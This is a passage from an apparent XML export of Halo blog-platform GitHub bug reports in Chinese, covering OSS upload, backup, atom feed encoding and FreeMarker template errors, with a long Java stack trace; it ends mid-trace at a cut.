		<body>在附件设置中调整了附件上传位置为阿里云OSS服务，以下为配置信息 ![image](https://user-images.githubusercontent.com/51355342/77226657-ffe98200-6bb4-11ea-9fd3-627f2271974b.png) 由于服务同样是部署在阿里云服务器，所以域名填写的是经典网络访问（内网）的Bucket域名 以下为OSS配置： ![image](https://user-images.githubusercontent.com/51355342/77226701-4f2fb280-6bb5-11ea-88be-5513fb8a794c.png) 以下为RAM用户配置： ![image](https://user-images.githubusercontent.com/51355342/77226729-75ede900-6bb5-11ea-863b-dccde985275c.png) ![image](https://user-images.githubusercontent.com/51355342/77226737-8bfba980-6bb5-11ea-97fe-4b4ad16b8344.png) 以下为具体错误信息： ![image](https://user-images.githubusercontent.com/51355342/77226745-a33a9700-6bb5-11ea-8f4a-3f95ef927882.png) </body>
		<created>2020-03-21 12:50:54</created>
		<closed>2020-03-29 08:46:59</closed>
	</bug>
	<bug>
		<id>665</id>
		<title>上传图片失败</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt; ![TIM图片20200315222936](https://user-images.githubusercontent.com/42953750/76703422-9842bb00-670c-11ea-8718-50bd51b6eb49.png)  </body>
		<created>2020-03-15 14:27:36</created>
		<closed>2020-03-15 14:37:04</closed>
	</bug>
	<bug>
		<id>661</id>
		<title>Failed to fetch backups</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt; 前辈你好，我是halo的使用者，最近在测试halo博客的备份功能，出现如无法备份的问题，请问是什么问题？ 目前还是ip访问 **版本信息：** Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production 启动时间：2020-02-20 17:20 **Linux报错信息：** ![HM5TK66DZ3TX(ZE99T{CGKY](https://user-images.githubusercontent.com/35891330/76693568-4ebd8600-66a2-11ea-81d4-f77470f21f22.png)      &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-03-15 01:46:56</created>
		<closed>2020-03-15 03:19:19</closed>
	</bug>
	<bug>
		<id>660</id>
		<title>在Anatole主题下访问SSR atom.xml页面上会出现错误提示</title>
		<body>## 我的环境 Server 版本：1.2.0 Admin 版本：1.2.0 数据库：MySQL 运行模式：production UA 信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 ![image](https://user-images.githubusercontent.com/20538542/76680573-97cef500-6624-11ea-87e8-eb08e035cf0c.png) 地址是：https://www.idreamyou.cn/atom.xml</body>
		<created>2020-03-14 10:50:38</created>
		<closed>2020-03-15 03:19:48</closed>
	</bug>
	<bug>
		<id>629</id>
		<title>1.3.0-beta.2 订阅格式有误。</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  版本：1.3.0-beta.2 数据库：H2 运行模式：production User Agent：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  https://ryanc.cc/atom.xml  ``` This page contains the following errors: error on line 22 at column 30: Input is not proper UTF-8, indicate encoding ! Bytes: 0x08 0x3C 0x2F 0x70 Below is a rendering of the page up to the first error. ```  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  正确输出订阅  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-03-09 10:02:00</created>
		<closed>2020-03-14 03:09:48</closed>
	</bug>
	<bug>
		<id>628</id>
		<title>1.3.0-beta.2 版本启动，访问http://127.0.0.1:8090初始化错误 </title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  halo:1.3.0-beta.2 os:Catalina  已删 ~/.halo 并且删除源码重新同步的master分支 ---  ## 错误日志  2020-03-09 14:48:29.797 ERROR 16271 --- [  XNIO-1 task-4] freemarker.runtime                       : Error executing FreeMarker template  freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; user  [in template "themes/anatole/module/macro.ftl" at line 13, column 36]  ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing&lt;/#if&gt;. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ----  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${user.nickname!}  [in template "themes/anatole/module/macro.ftl" in macro "head" at line 13, column 34] - Reached through: @head title="${blog_title!}"  [in template "themes/anatole/index.ftl" at line 2, column 1] ---- at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnexpectedTypeException.newDescriptionBuilder(UnexpectedTypeException.java:85) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnexpectedTypeException.&lt;init&gt;(UnexpectedTypeException.java:48) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.NonHashException.&lt;init&gt;(NonHashException.java:49) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Dot._eval(Dot.java:48) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DefaultToExpression._eval(DefaultToExpression.java:88) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Expression.eval(Expression.java:101) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.DollarVariable.accept(DollarVariable.java:63) ~[freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:367) [freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.invokeMacroOrFunctionCommonPart(Environment.java:872) [freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.invokeMacro(Environment.java:809) [freemarker-2.3.29.jar:2.3.29] at freemarker.core.UnifiedCall.accept(UnifiedCall.java:83) [freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:331) [freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.visit(Environment.java:337) [freemarker-2.3.29.jar:2.3.29] at freemarker.core.Environment.process(Environment.java:310) [freemarker-2.3.29.jar:2.3.29] at freemarker.template.Template.process(Template.java:383) [freemarker-2.3.29.jar:2.3.29] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.processTemplate(FreeMarkerView.java:391) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.doRender(FreeMarkerView.java:304) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.renderMergedTemplateModel(FreeMarkerView.java:255) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:179) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:316) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1373) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1118) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1057) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:503) [jakarta.servlet-api-4.0.3.jar:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) [jakarta.servlet-api-4.0.3.jar:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) [main/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) [main/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) [spring-boot-actuator-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_152] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_152] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_152]  2020-03-09 14:48:29.799 ERROR 16271 --- [  XNIO-1 task-4] io.undertow.request                      : UT005023: Exception handling request to /  org.springframework.web.util.NestedServletException: Request processing failed; nested exception is freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; user  [in template "themes/anatole/module/macro.ftl" at line 13, column 36]  ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing&lt;/#if&gt;. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ----  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${user.nickname!}  [in template "themes/anatole/module/macro.ftl" in macro "head" at line 13, column 34] - Reached through: @head title="${blog_title!}"  [in template "themes/anatole/index.ftl" at line 2, column 1] ---- at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:503) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.2.RELEASE.jar:5.2.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) ~[main/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) ~[main/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) ~[spring-boot-actuator-2.2.2.RELEASE.jar:2.2.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar:5.2.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) [undertow-servlet-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.28.Final.jar:2.0.28.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_152] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_152] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_152] Caused by: 